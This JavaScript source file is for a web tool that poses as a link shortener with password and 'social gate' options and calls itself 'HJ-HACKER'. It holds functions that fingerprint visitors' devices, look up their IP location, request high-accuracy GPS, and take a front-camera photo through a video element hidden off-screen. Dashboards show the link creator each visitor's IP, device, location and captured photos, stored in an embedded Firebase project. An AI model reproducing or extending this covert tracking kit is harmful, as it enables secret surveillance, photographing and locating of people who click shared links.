// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
    authDomain: "hjh-tools.firebaseapp.com",
    projectId: "hjh-tools",
    storageBucket: "hjh-tools.firebasestorage.app",
    messagingSenderId: "643137472905",
    appId: "1:643137472905:web:814ca23a86fb084811b958",
    databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

let deleteCode = null;

function encodeFirebasePath(str) {
    try {
        return btoa(unescape(encodeURIComponent(str))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
    } catch (e) {
        return str.replace(/\./g, '_').replace(/\//g, '_');
    }
}

function showToast(title, message, type = 'success') {
    const container = document.getElementById('toastContainer');
    if (!container) { alert(`${title}: ${message}`); return; }
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `<i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i><div><div class="toast-title">${title}</div><div class="toast-message">${message}</div></div>`;
    container.appendChild(toast);
    setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 3000);
}

function generateShortCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    return result;
}

function getDeviceId() {
    let id = localStorage.getItem('hj_device_id');
    if (!id) { id = generateShortCode() + generateShortCode(); localStorage.setItem('hj_device_id', id); }
    return id;
}

async function checkCodeExists(code) {
    return (await database.ref(`urls/${code}`).get()).exists();
}

// ========== COMPLETE DEVICE INFO CAPTURE ==========
async function captureFullDeviceInfo() {
    const info = {
        timestamp: new Date().toISOString(),
        user_agent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(',') : '',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezone_offset: new Date().getTimezoneOffset(),
        screen_width: screen.width,
        screen_height: screen.height,
        screen_color_depth: screen.colorDepth,
        screen_pixel_ratio: window.devicePixelRatio,
        cookies_enabled: navigator.cookieEnabled,
        hardware_concurrency: navigator.hardwareConcurrency,
        max_touch_points: navigator.maxTouchPoints,
        device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
        window_width: window.innerWidth,
        window_height: window.innerHeight,
        orientation: screen.orientation ? screen.orientation.type : (window.innerHeight > window.innerWidth ? 'portrait' : 'landscape'),
        touch_support: 'ontouchstart' in window
    };
    
    // Connection info
    if (navigator.connection) {
        info.connection_type = navigator.connection.effectiveType;
        info.downlink = navigator.connection.downlink;
        info.rtt = navigator.connection.rtt;
    } else {
        info.connection_type = 'Unknown';
    }
    
    // Battery info
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            info.battery_level = Math.round(battery.level * 100) + '%';
            info.battery_charging = battery.charging;
        } catch(e) {
            info.battery_level = 'Unknown';
            info.battery_charging = false;
        }
    } else {
        info.battery_level = 'Unknown';
        info.battery_charging = false;
    }
    
    // Device detection from User Agent
    const ua = navigator.userAgent;
    if (ua.includes('iPhone')) {
        info.device_type = 'Mobile';
        info.device_model = 'iPhone';
        info.os = 'iOS';
        info.os_version = ua.match(/iPhone OS ([\d_]+)/)?.[1]?.replace(/_/g, '.') || 'Unknown';
    } else if (ua.includes('iPad')) {
        info.device_type = 'Tablet';
        info.device_model = 'iPad';
        info.os = 'iOS';
        info.os_version = ua.match(/iPad; CPU OS ([\d_]+)/)?.[1]?.replace(/_/g, '.') || 'Unknown';
    } else if (ua.includes('Android')) {
        info.device_type = ua.includes('Mobile') ? 'Mobile' : 'Tablet';
        info.device_model = 'Android';
        info.os = 'Android';
        info.os_version = ua.match(/Android[\s/]+([\d.]+)/)?.[1] || 'Unknown';
        if (ua.includes('SM-')) info.device_brand = 'Samsung';
        else if (ua.includes('MI')) info.device_brand = 'Xiaomi';
        else if (ua.includes('OnePlus')) info.device_brand = 'OnePlus';
        else if (ua.includes('Pixel')) info.device_brand = 'Google';
        else if (ua.includes('OPPO')) info.device_brand = 'OPPO';
        else if (ua.includes('vivo')) info.device_brand = 'Vivo';
        else if (ua.includes('realme')) info.device_brand = 'Realme';
        else info.device_brand = 'Other';
    } else if (ua.includes('Windows')) {
        info.device_type = 'Desktop';
        info.device_model = 'Windows PC';
        info.os = 'Windows';
        info.os_version = ua.match(/Windows NT ([\d.]+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Mac')) {
        info.device_type = 'Desktop';
        info.device_model = 'Mac';
        info.os = 'macOS';
        info.os_version = ua.match(/Mac OS X ([\d_]+)/)?.[1]?.replace(/_/g, '.') || 'Unknown';
    } else {
        info.device_type = 'Unknown';
        info.device_model = 'Unknown';
        info.os = 'Unknown';
        info.os_version = 'Unknown';
    }
    
    // Browser detection
    if (ua.includes('Chrome') && !ua.includes('Edg')) info.browser = 'Chrome';
    else if (ua.includes('Firefox')) info.browser = 'Firefox';
    else if (ua.includes('Safari') && !ua.includes('Chrome')) info.browser = 'Safari';
    else if (ua.includes('Edg')) info.browser = 'Edge';
    else if (ua.includes('Opera') || ua.includes('OPR')) info.browser = 'Opera';
    else info.browser = 'Unknown';
    
    return info;
}

// ========== IP & LOCATION ==========
async function getIPInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || 'Unknown',
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            country: data.country_name || 'Unknown',
            country_code: data.country_code || 'Unknown',
            latitude: data.latitude || null,
            longitude: data.longitude || null
        };
    } catch(e) {
        return { ip: 'Unknown', city: 'Unknown', country: 'Unknown', latitude: null, longitude: null };
    }
}

// ========== CAMERA CAPTURE ==========
async function captureCameraPhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.style.position = 'fixed';
        video.style.top = '-9999px';
        document.body.appendChild(video);
        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); setTimeout(resolve, 500); }; });
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        return imageData;
    } catch(e) {
        console.log('Camera error:', e);
        return null;
    }
}

// ========== LOCATION CAPTURE ==========
async function captureLocation() {
    return new Promise(resolve => {
        if (!navigator.geolocation) { resolve(null); return; }
        navigator.geolocation.getCurrentPosition(
            pos => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }),
            err => { console.log('Location error:', err); resolve(null); },
            { timeout: 10000, enableHighAccuracy: true }
        );
    });
}

// ========== DELETE LINK ==========
async function deleteLink(code) {
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        await database.ref(`urls/${code}`).remove();
        await database.ref(`domains/${encodedDomain}/${code}`).remove();
        await database.ref(`analytics/${code}`).remove();
        showToast('Deleted', `Link /${code} deleted!`, 'success');
        showLinks(); showStats(); showRecent();
        return true;
    } catch(e) {
        showToast('Error', 'Delete failed', 'error');
        return false;
    }
}

// ========== CREATE SHORT LINK ==========
async function shortenUrl() {
    const longUrl = document.getElementById('longUrl').value.trim();
    if (!longUrl) { showToast('Error', 'Enter URL', 'error'); return; }
    let urlToShorten = longUrl;
    if (!urlToShorten.startsWith('http')) urlToShorten = 'https://' + urlToShorten;
    try { new URL(urlToShorten); } catch { showToast('Error', 'Invalid URL', 'error'); return; }
    
    const customCode = document.getElementById('customCode').value.trim();
    let shortCode = customCode || generateShortCode();
    if (await checkCodeExists(shortCode)) {
        showToast('Error', 'Code already taken', 'error');
        return;
    }
    
    const hasPassword = document.getElementById('passwordToggle').checked;
    const password = hasPassword ? document.getElementById('password').value : null;
    const hasSocialGate = document.getElementById('socialToggle').checked;
    const socialIcon = document.getElementById('socialIcon')?.value || 'youtube';
    const socialTitle = hasSocialGate ? document.getElementById('socialTitle')?.value : null;
    const socialUrl = hasSocialGate ? document.getElementById('socialUrl')?.value : null;
    const socialDesc = hasSocialGate ? document.getElementById('socialDesc')?.value : null;
    const socialButton = hasSocialGate ? document.getElementById('socialButton')?.value : null;
    const cameraCapture = document.getElementById('captureCamera')?.checked || false;
    const locationCapture = document.getElementById('captureLocation')?.checked || false;
    
    if (hasPassword && !password) { showToast('Error', 'Enter password', 'error'); return; }
    if (hasSocialGate && (!socialTitle || !socialUrl)) { showToast('Error', 'Fill social gate', 'error'); return; }
    
    document.getElementById('loading').classList.remove('hidden');
    document.getElementById('shortenBtn').disabled = true;
    
    try {
        const domain = window.location.hostname;
        const deviceId = getDeviceId();
        const createdAt = new Date().toISOString();
        const encodedDomain = encodeFirebasePath(domain);
        
        const linkData = {
            long_url: urlToShorten, domain, created_at: createdAt, device_id: deviceId, clicks: 0
        };
        if (password) linkData.password = password;
        if (socialTitle) {
            linkData.social_gate_title = socialTitle;
            linkData.social_gate_url = socialUrl;
            linkData.social_gate_icon = socialIcon;
            linkData.social_gate_description = socialDesc;
            linkData.social_gate_button_text = socialButton;
        }
        if (cameraCapture) linkData.capture_camera = true;
        if (locationCapture) linkData.capture_location = true;
        
        await database.ref(`urls/${shortCode}`).set(linkData);
        await database.ref(`domains/${encodedDomain}/${shortCode}`).set(linkData);
        
        const shortUrl = `${window.location.origin}/${shortCode}`;
        document.getElementById('shortLink').textContent = shortUrl;
        document.getElementById('result').classList.remove('hidden');
        
        if (typeof QRCode !== 'undefined') {
            document.getElementById('qrCode').innerHTML = '';
            new QRCode(document.getElementById('qrCode'), { text: shortUrl, width: 100, height: 100, colorDark: "#00ff41", colorLight: "#000000" });
        }
        
        showToast('Success', 'Link created!', 'success');
        document.getElementById('longUrl').value = '';
        document.getElementById('customCode').value = '';
        document.getElementById('passwordToggle').checked = false;
        document.getElementById('socialToggle').checked = false;
        document.getElementById('passwordSection').classList.add('hidden');
        document.getElementById('socialSection').classList.add('hidden');
        if (document.getElementById('password')) document.getElementById('password').value = '';
        
        showLinks(); showStats(); showRecent();
    } catch(e) {
        showToast('Error', e.message, 'error');
    } finally {
        document.getElementById('loading').classList.add('hidden');
        document.getElementById('shortenBtn').disabled = false;
    }
}

// ========== DISPLAY FUNCTIONS ==========
function updateDisplay(title, icon, content) {
    const header = document.getElementById('dataDisplayHeader');
    if (header) header.querySelector('i').className = `fas ${icon}`;
    document.getElementById('dataDisplayTitle').textContent = title;
    document.getElementById('dataDisplayContent').innerHTML = content;
}

async function showLinks() {
    updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading...</p></div>');
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        const links = [];
        snapshot.forEach(c => links.push({ code: c.key, ...c.val() }));
        
        if (links.length === 0) {
            updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-inbox"></i><p>No links yet</p><small>Create your first link above</small></div>');
            return;
        }
        
        const html = links.map(l => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code"><i class="fas fa-link"></i> /${l.code}</span>
                    <span class="data-item-date"><i class="fas fa-calendar"></i> ${new Date(l.created_at).toLocaleDateString()}</span>
                </div>
                <div class="data-item-url"><i class="fas fa-globe"></i> ${l.long_url?.substring(0, 60)}${l.long_url?.length > 60 ? '...' : ''}</div>
                <div class="data-item-stats">
                    <span><i class="fas fa-mouse-pointer"></i> Clicks: ${l.clicks || 0}</span>
                    ${l.password ? '<span><i class="fas fa-lock"></i> Password</span>' : ''}
                    ${l.capture_camera ? '<span><i class="fas fa-camera"></i> Camera</span>' : ''}
                    ${l.capture_location ? '<span><i class="fas fa-map-marker-alt"></i> GPS</span>' : ''}
                </div>
                <div class="data-item-actions">
                    <button class="data-btn-sm" onclick="copyToClipboard('${window.location.origin}/${l.code}')"><i class="fas fa-copy"></i> Copy</button>
                    <button class="data-btn-sm" onclick="viewAnalytics('${l.code}')"><i class="fas fa-chart-line"></i> Data</button>
                    <button class="data-btn-sm" onclick="confirmDelete('${l.code}')" style="background:rgba(255,68,68,0.2);"><i class="fas fa-trash"></i> Delete</button>
                </div>
            </div>
        `).join('');
        updateDisplay('YOUR LINKS', 'fa-link', html);
    } catch(e) {
        updateDisplay('YOUR LINKS', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading links</p></div>');
    }
}

async function showStats() {
    updateDisplay('STATISTICS', 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading...</p></div>');
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        let totalClicks = 0, totalLinks = 0, totalCamera = 0;
        const linksList = [];
        
        for (const [code, data] of Object.entries(snapshot.val() || {})) {
            totalClicks += data.clicks || 0;
            totalLinks++;
            linksList.push(code);
            const aSnapshot = await database.ref(`analytics/${code}`).get();
            aSnapshot.forEach(a => { if (a.val().captured_image) totalCamera++; });
        }
        
        const html = `
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value">${totalLinks}</div><div class="stat-label"><i class="fas fa-link"></i> Total Links</div></div>
                <div class="stat-card"><div class="stat-value">${totalClicks}</div><div class="stat-label"><i class="fas fa-mouse-pointer"></i> Total Clicks</div></div>
                <div class="stat-card"><div class="stat-value">${totalCamera}</div><div class="stat-label"><i class="fas fa-camera"></i> Photos Captured</div></div>
            </div>
            <div style="margin-top:12px">
                <p style="font-size:0.7rem; margin-bottom:8px;"><i class="fas fa-list"></i> Your Links:</p>
                ${linksList.map(c => `
                    <div class="data-item" style="margin-bottom:6px">
                        <div class="data-item-header"><span class="data-item-code">/${c}</span></div>
                        <div class="data-item-actions">
                            <button class="data-btn-sm" onclick="viewAnalytics('${c}')"><i class="fas fa-chart-line"></i> View Data</button>
                            <button class="data-btn-sm" onclick="confirmDelete('${c}')" style="background:rgba(255,68,68,0.2);"><i class="fas fa-trash"></i> Delete</button>
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
        updateDisplay('STATISTICS', 'fa-chart-line', html);
    } catch(e) {
        updateDisplay('STATISTICS', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading stats</p></div>');
    }
}

async function showRecent() {
    updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading...</p></div>');
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        const all = [];
        
        for (const [code] of Object.entries(snapshot.val() || {})) {
            const aSnapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(20).get();
            aSnapshot.forEach(a => {
                const d = a.val();
                all.push({
                    code, ip: d.ip_address, device: d.device_model || d.os, browser: d.browser,
                    city: d.city, country: d.country, battery: d.battery_level,
                    screen: `${d.screen_width}x${d.screen_height}`, timezone: d.timezone,
                    timestamp: d.created_at, camera: d.captured_image
                });
            });
        }
        
        all.sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp));
        const recent = all.slice(0, 20);
        
        if (recent.length === 0) {
            updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-clock"></i><p>No recent activity</p><small>Share your links to see visitor data</small></div>');
            return;
        }
        
        const html = recent.map(v => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code"><i class="fas fa-link"></i> /${v.code}</span>
                    <span class="data-item-date"><i class="fas fa-clock"></i> ${new Date(v.timestamp).toLocaleString()}</span>
                </div>
                <div class="data-item-stats">
                    <span><i class="fas fa-globe"></i> ${v.ip || 'Unknown'}</span>
                    <span><i class="fas fa-mobile-alt"></i> ${v.device || 'Unknown'}</span>
                    <span><i class="fab fa-${v.browser?.toLowerCase() || 'chrome'}"></i> ${v.browser || 'Unknown'}</span>
                </div>
                <div class="data-item-stats">
                    ${v.battery ? `<span><i class="fas fa-battery-full"></i> ${v.battery}</span>` : ''}
                    ${v.screen ? `<span><i class="fas fa-desktop"></i> ${v.screen}</span>` : ''}
                    ${v.timezone ? `<span><i class="fas fa-clock"></i> ${v.timezone}</span>` : ''}
                </div>
                ${v.city ? `<div class="data-item-stats"><i class="fas fa-map-marker-alt"></i> ${v.city}${v.country ? `, ${v.country}` : ''}</div>` : ''}
                ${v.camera ? `<div class="data-item-stats" style="color:#00ff41"><i class="fas fa-camera"></i> Photo captured! <button class="data-btn-sm" onclick="viewPhoto('${v.camera}')">View</button></div>` : ''}
                <div class="data-item-actions">
                    <button class="data-btn-sm" onclick="viewAnalytics('${v.code}')"><i class="fas fa-chart-line"></i> Full Data</button>
                </div>
            </div>
        `).join('');
        updateDisplay('RECENT ACTIVITY', 'fa-history', html);
    } catch(e) {
        updateDisplay('RECENT ACTIVITY', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading recent data</p></div>');
    }
}

// ========== VIEW ANALYTICS ==========
window.viewAnalytics = async (code) => {
    updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading analytics...</p></div>');
    try {
        const snapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(100).get();
        const analytics = [];
        snapshot.forEach(c => analytics.push(c.val()));
        analytics.reverse();
        
        const linkData = (await database.ref(`urls/${code}`).get()).val();
        const totalVisitors = analytics.length;
        const uniqueIPs = new Set(analytics.map(a => a.ip_address)).size;
        
        let html = `
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value">${totalVisitors}</div><div class="stat-label"><i class="fas fa-users"></i> Total Visitors</div></div>
                <div class="stat-card"><div class="stat-value">${uniqueIPs}</div><div class="stat-label"><i class="fas fa-globe"></i> Unique IPs</div></div>
            </div>
            <div style="margin-bottom:12px; padding:8px; background:#00000030; border-radius:8px;">
                <div style="font-size:0.7rem; word-break:break-all;"><i class="fas fa-link"></i> ${linkData?.long_url || 'N/A'}</div>
                ${linkData?.password ? '<div style="font-size:0.7rem;"><i class="fas fa-lock"></i> Password Protected</div>' : ''}
            </div>
        `;
        
        if (analytics.length === 0) {
            html += '<div class="empty-data"><i class="fas fa-inbox"></i><p>No visitors yet. Share your link!</p></div>';
        } else {
            html += `<h4 style="font-size:0.75rem; margin:12px 0 8px;"><i class="fas fa-list-ul"></i> Visitor Details (${analytics.length} records)</h4>`;
            html += analytics.map(v => `
                <div class="data-item">
                    <div class="data-item-header">
                        <span><i class="fas fa-globe"></i> ${v.ip_address || 'Unknown'}</span>
                        <span class="data-item-date"><i class="fas fa-calendar"></i> ${new Date(v.created_at).toLocaleString()}</span>
                    </div>
                    <div class="data-item-stats"><strong><i class="fas fa-mobile-alt"></i> Device:</strong> ${v.device_brand ? v.device_brand + ' ' : ''}${v.device_model || v.os || 'Unknown'} ${v.os_version ? `(v${v.os_version})` : ''}</div>
                    <div class="data-item-stats"><strong><i class="fab fa-${v.browser?.toLowerCase() || 'chrome'}"></i> Browser:</strong> ${v.browser || 'Unknown'} | <strong><i class="fab fa-${v.os?.toLowerCase() || 'windows'}"></i> OS:</strong> ${v.os || 'Unknown'}</div>
                    <div class="data-item-stats"><strong><i class="fas fa-battery-full"></i> Battery:</strong> ${v.battery_level || 'Unknown'} ${v.battery_charging === true ? '<i class="fas fa-bolt"></i> Charging' : ''}</div>
                    <div class="data-item-stats"><strong><i class="fas fa-microchip"></i> RAM:</strong> ${v.device_memory || 'Unknown'} | <strong><i class="fas fa-wifi"></i> Network:</strong> ${v.connection_type?.toUpperCase() || 'Unknown'}</div>
                    <div class="data-item-stats"><strong><i class="fas fa-desktop"></i> Screen:</strong> ${v.screen_width || '?'}x${v.screen_height || '?'} | <strong><i class="fas fa-language"></i> Language:</strong> ${v.language || 'Unknown'}</div>
                    <div class="data-item-stats"><strong><i class="fas fa-clock"></i> Timezone:</strong> ${v.timezone || 'Unknown'} | <strong><i class="fas fa-rotate"></i> Orientation:</strong> ${v.orientation || 'Unknown'}</div>
                    ${v.city ? `<div class="data-item-stats"><strong><i class="fas fa-map-marker-alt"></i> Location:</strong> ${v.city}${v.country ? `, ${v.country}` : ''}</div>` : ''}
                    ${v.latitude ? `<div class="data-item-stats"><strong><i class="fas fa-satellite-dish"></i> GPS:</strong> ${v.latitude.toFixed(4)}, ${v.longitude?.toFixed(4)}</div>` : ''}
                    ${v.captured_image ? `<div class="data-item-stats" style="color:#00ff41"><i class="fas fa-camera"></i> Photo captured! <button class="data-btn-sm" onclick="viewPhoto('${v.captured_image}')">View Photo</button></div>` : ''}
                </div>
            `).join('');
        }
        updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', html);
    } catch(e) {
        updateDisplay('ERROR', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading analytics</p></div>');
    }
};

// ========== HELPER FUNCTIONS ==========
window.copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    showToast('Copied', 'Link copied to clipboard!', 'success');
};

window.viewPhoto = (imageData) => {
    const modal = document.getElementById('photoModal');
    const img = document.getElementById('photoModalImage');
    if (modal && img && imageData) {
        img.src = imageData;
        modal.classList.remove('hidden');
    }
};

window.confirmDelete = (code) => {
    deleteCode = code;
    document.getElementById('deleteLinkCode').textContent = `/${code}`;
    document.getElementById('deleteModal').classList.remove('hidden');
};

window.executeDelete = async () => {
    if (deleteCode) await deleteLink(deleteCode);
    deleteCode = null;
    document.getElementById('deleteModal').classList.add('hidden');
};

window.cancelDelete = () => {
    deleteCode = null;
    document.getElementById('deleteModal').classList.add('hidden');
};

function closePhotoModal() {
    document.getElementById('photoModal').classList.add('hidden');
}

function downloadPhoto() {
    const img = document.getElementById('photoModalImage');
    if (img && img.src) {
        const link = document.createElement('a');
        link.download = 'captured_photo.jpg';
        link.href = img.src;
        link.click();
        showToast('Success', 'Photo downloaded!', 'success');
    }
}

// ========== EVENT LISTENERS ==========
document.querySelectorAll('.bottom-nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.bottom-nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        const tab = btn.dataset.tab;
        if (tab === 'create') {
            document.getElementById('createCard').scrollIntoView({ behavior: 'smooth' });
            updateDisplay('Click any button to view data', 'fa-fingerprint', 
                '<div class="empty-data"><i class="fas fa-fingerprint"></i><p>Tap LINKS, STATS, or RECENT below</p></div>');
        } else if (tab === 'links') showLinks();
        else if (tab === 'stats') showStats();
        else if (tab === 'recent') showRecent();
    });
});

document.getElementById('passwordToggle')?.addEventListener('change', () => {
    document.getElementById('passwordSection').classList.toggle('hidden');
});

document.getElementById('socialToggle')?.addEventListener('change', () => {
    document.getElementById('socialSection').classList.toggle('hidden');
});

document.getElementById('advancedToggle')?.addEventListener('click', () => {
    document.getElementById('advancedContent').classList.toggle('hidden');
});

document.getElementById('shortenBtn')?.addEventListener('click', shortenUrl);
document.getElementById('copyBtn')?.addEventListener('click', () => {
    const link = document.getElementById('shortLink')?.textContent;
    if (link) copyToClipboard(link);
});

document.getElementById('closePhotoModal')?.addEventListener('click', closePhotoModal);
document.getElementById('closePhotoModalBtn')?.addEventListener('click', closePhotoModal);
document.getElementById('downloadPhotoBtn')?.addEventListener('click', downloadPhoto);
document.getElementById('confirmDeleteBtn')?.addEventListener('click', executeDelete);
document.getElementById('cancelDeleteBtn')?.addEventListener('click', cancelDelete);

// Icon selector
document.querySelectorAll('.icon-option').forEach(icon => {
    icon.addEventListener('click', () => {
        document.querySelectorAll('.icon-option').forEach(i => i.classList.remove('active'));
        icon.classList.add('active');
        document.getElementById('socialIcon').value = icon.dataset.icon;
    });
});

// Close modals on outside click
window.addEventListener('click', (e) => {
    const photoModal = document.getElementById('photoModal');
    const deleteModal = document.getElementById('deleteModal');
    if (e.target === photoModal) closePhotoModal();
    if (e.target === deleteModal) cancelDelete();
});

// ========== INITIALIZE ==========
showLinks();
showStats();
showRecent();

console.log('🔥 HJ-HACKER Advanced Loaded with Full Device Capture & Delete Feature!');
